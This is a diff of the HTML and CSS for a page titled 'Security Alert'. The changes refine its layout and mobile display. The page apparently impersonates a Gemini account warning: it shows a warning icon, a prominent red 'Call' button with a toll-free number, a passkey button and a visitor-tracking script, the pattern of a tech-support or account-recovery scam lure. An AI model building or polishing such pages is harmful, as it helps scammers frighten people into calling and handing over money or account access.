@@ -5,6 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Security Alert</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
       padding: 0;
@@ -14,13 +18,23 @@
       flex-direction: column;
       align-items: center;
       padding: 40px 20px;
+      min-height: 100vh;
+    }
+
+    .top-right, .logo {
+      position: absolute;
+      top: 20px;
+      font-size: 14px;
+      white-space: nowrap;
     }
 
     .top-right {
-      position: absolute;
-      top: 20px;
       right: 20px;
-      font-size: 14px;
+      text-align: right;
+    }
+
+    .logo {
+      left: 20px;
     }
 
     .top-right a {
@@ -30,12 +44,7 @@
       background-color: #f0f0f0;
       padding: 10px 14px;
       border-radius: 20px;
-    }
-
-    .logo {
-      position: absolute;
-      top: 20px;
-      left: 20px;
+      display: inline-block;
     }
 
     .logo img {
@@ -43,9 +52,11 @@
     }
 
     .alert-container {
+      width: 100%;
       max-width: 600px;
       text-align: center;
-      margin-top: 100px;
+      margin-top: 120px;
+      padding: 20px;
     }
 
     .alert-title {
@@ -57,6 +68,7 @@
       justify-content: center;
       gap: 10px;
       margin-bottom: 16px;
+      flex-wrap: wrap;
     }
 
     .alert-title img {
@@ -71,21 +83,28 @@
       margin-bottom: 30px;
     }
 
-    .call-button {
+    .call-button,
+    .passkey-button {
       display: inline-flex;
       align-items: center;
       justify-content: center;
+      gap: 10px;
+      width: 100%;
+      max-width: 350px;
+      padding: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+      text-decoration: none;
+      margin: 0 auto;
+    }
+
+    .call-button {
       background-color: #ff4747;
       color: black;
-      font-size: 18px;
-      font-weight: bold;
-      padding: 16px;
-      border: none;
-      border-radius: 8px;
-      text-decoration: none;
-      gap: 10px;
-      min-width: 350px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      margin-bottom: 20px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
     }
 
     .call-button i {
@@ -95,17 +114,7 @@
     .passkey-button {
       background-color: #eee;
       color: #000;
-      font-size: 16px;
-      padding: 14px 20px;
       border-radius: 30px;
-      border: none;
-      margin-top: 40px;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      min-width: 350px;
-      font-weight: bold;
     }
 
     .remember {
@@ -115,32 +124,69 @@
       align-items: center;
       justify-content: center;
       gap: 8px;
+      flex-wrap: wrap;
+      text-align: center;
     }
 
-    @media (max-width: 500px) {
+    .remember input[type="checkbox"] {
+      transform: scale(1.2);
+    }
+
+    /* Better Mobile Responsiveness */
+    @media (max-width: 600px) {
+      body {
+        padding: 20px 10px;
+      }
+
+      .alert-title {
+        font-size: 20px;
+        flex-direction: column;
+        gap: 6px;
+      }
+
       .alert-message {
         font-size: 16px;
       }
 
       .call-button, .passkey-button {
-        min-width: 100%;
-        font-size: 16px;
+        font-size: 15px;
         padding: 14px;
+        max-width: 100%;
+      }
+
+      .top-right, .logo {
+        position: static;
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      .top-right a {
+        font-size: 13px;
+        padding: 10px 14px;
+        display: inline-block;
+      }
+
+      .alert-container {
+        margin-top: 40px;
+        padding: 10px;
       }
     }
   </style>
 </head>
 <body>
 
+  <!-- Logo -->
   <div class="logo">
     <img src="logo.jpg" alt="Logo" />
   </div>
 
+  <!-- Top right link -->
   <div class="top-right">
     Don’t have a Gemini account?
     <a href="#">Create a new account</a>
   </div>
 
+  <!-- Alert Content -->
   <div class="alert-container">
     <div class="alert-title">
       <img src="icons8-warning-30.png" alt="Warning Icon">
@@ -154,7 +200,7 @@
     </div>
 
     <a href="tel:+18339219241" class="call-button">
-      <i>📞</i> Call: <span style="font-weight: bold;">+1(833)921-9241</span>
+      <i>📞</i> Call: <span style="font-weight: bold;">+1 (833) 921-9241</span>
     </a>
 
     <button class="passkey-button">
@@ -167,7 +213,7 @@
     </div>
   </div>
 
-<!-- begin code v 7.0 -->
+  <!-- begin code v 7.0 -->
 <span id="wts2200954"></span>
 <script>var wts=document.createElement('script');wts.async=true;
 wts.src='https://app.ardalio.com/wts7.js';document.head.appendChild(wts);
@@ -175,7 +221,5 @@ wts.onload = function(){ wtsl7(2200954,2); };
 </script><noscript><img src="https://app.ardalio.com/7/2/2200954.png"></noscript>
 <!-- end code v 7.0 -->
 
-
-  
 </body>
 </html>
